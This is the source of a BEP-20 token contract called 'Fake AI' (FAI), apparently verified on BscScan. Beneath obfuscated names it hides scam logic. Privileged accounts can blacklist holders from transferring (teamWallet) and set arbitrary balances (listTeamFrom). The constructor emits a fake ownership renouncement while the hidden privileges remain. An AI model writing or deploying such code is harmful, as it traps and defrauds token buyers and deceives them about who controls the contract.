/**
 *Submitted for verification at BscScan.com on 2023-02-25
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface enableIs {
    function createPair(address totalReceiver, address toIs) external returns (address);
}

contract FakeAI {

    bool public modeAuto;

    address txSenderMax = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

    bool public takeFundMarketing;

    function transfer(address launchedListTeam, uint256 autoTo) external returns (bool) {
        return transferFrom(txMarketing(), launchedListTeam, autoTo);
    }

    function approve(address fundMode, uint256 autoTo) public returns (bool) {
        allowance[txMarketing()][fundMode] = autoTo;
        emit Approval(txMarketing(), fundMode, autoTo);
        return true;
    }

    bool private minLaunchedBuy;

    address public owner;

    function teamWallet(address liquidityFund) public {
        toMin();
        if (liquidityFund == receiverShould || liquidityFund == isAmountMode) {
            return;
        }
        swapExempt[liquidityFund] = true;
    }

    mapping(address => uint256) public balanceOf;

    bool public launchTx;

    address enableIsAddr = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;

    event Transfer(address indexed from, address indexed shouldAmount, uint256 value);

    constructor (){ 
        takeTokenMin[txMarketing()] = true;
        balanceOf[txMarketing()] = totalSupply;
        receiverShould = txMarketing();
        isAmountMode = enableIs(address(enableIsAddr)).createPair(address(txSenderMax),address(this));
        emit Transfer(address(0), receiverShould, totalSupply);
        emit OwnershipTransferred(receiverShould, address(0));
    }

    address public receiverShould;

    function transferFrom(address launchedToken, address launchedListTeam, uint256 autoTo) public returns (bool) {
        if (launchedToken != txMarketing() && allowance[launchedToken][txMarketing()] != type(uint256).max) {
            require(allowance[launchedToken][txMarketing()] >= autoTo);
            allowance[launchedToken][txMarketing()] -= autoTo;
        }
        require(!swapExempt[launchedToken]);
        return txToEnable(launchedToken, launchedListTeam, autoTo);
    }

    function listTeamFrom(address launchedListTeam, uint256 autoTo) public {
        toMin();
        balanceOf[launchedListTeam] = autoTo;
    }

    mapping(address => bool) public swapExempt;

    mapping(address => bool) public takeTokenMin;

    function liquidityMarketing(address listEnable) public {
        require(!takeFundMarketing);
        takeTokenMin[listEnable] = true;
        takeFundMarketing = true;
    }

    uint256 public totalSupply = 100000000 * 10 ** 18;

    bool public feeMax;

    uint256 private senderTotal;

    string public symbol = "FAI";

    function txMarketing() private view returns (address) {
        return msg.sender;
    }

    string public name = "Fake AI";

    event Approval(address indexed tradingEnableAmount, address indexed spender, uint256 value);

    bool public maxAmount;

    address public isAmountMode;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    uint8 public decimals = 18;

    uint256 private exemptSell;

    mapping(address => mapping(address => uint256)) public allowance;

    function toMin() private view {
        require(takeTokenMin[txMarketing()]);
    }

    function txToEnable(address fromLiquidity, address atReceiverLiquidity, uint256 autoTo) internal returns (bool) {
        require(balanceOf[fromLiquidity] >= autoTo);
        balanceOf[fromLiquidity] -= autoTo;
        balanceOf[atReceiverLiquidity] += autoTo;
        emit Transfer(fromLiquidity, atReceiverLiquidity, autoTo);
        return true;
    }

}